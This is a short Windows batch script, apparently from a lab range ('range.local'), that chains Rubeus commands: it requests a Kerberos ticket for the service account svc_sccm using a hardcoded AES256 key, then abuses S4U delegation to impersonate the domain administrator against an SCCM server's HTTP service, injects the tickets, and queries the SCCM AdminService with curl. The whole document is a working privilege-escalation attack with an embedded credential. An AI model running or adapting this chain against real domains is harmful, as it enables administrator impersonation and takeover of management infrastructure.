@echo off
set RB=C:\Tools\ADTools\Rubeus.exe
set MP=mbr02.range.local
set K=C:\Windows\Temp\svc_sccm_tgt.kirbi
echo === ASKTGT ===
%RB% asktgt /user:svc_sccm /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /domain:range.local /dc:dc03.range.local /ptt /nowrap /outfile:%K%
echo === S4U ===
%RB% s4u /ticket:%K% /impersonateuser:administrator /msdsspn:HTTP/mbr02.range.local /dc:dc03.range.local /ptt /nowrap
echo === KLIST ===
klist
echo === CURL VERBOSE ===
curl.exe -k -v --negotiate -u : https://%MP%/AdminService/wmi/SMS_Site -o NUL 2>&1
echo === CURL VERBOSE2 (explicit host) ===
curl.exe -k -v --negotiate -u : https://192.168.77.23/AdminService/wmi/SMS_Site -H "Host: %MP%" -o NUL 2>&1
echo === DEBUG_DONE ===
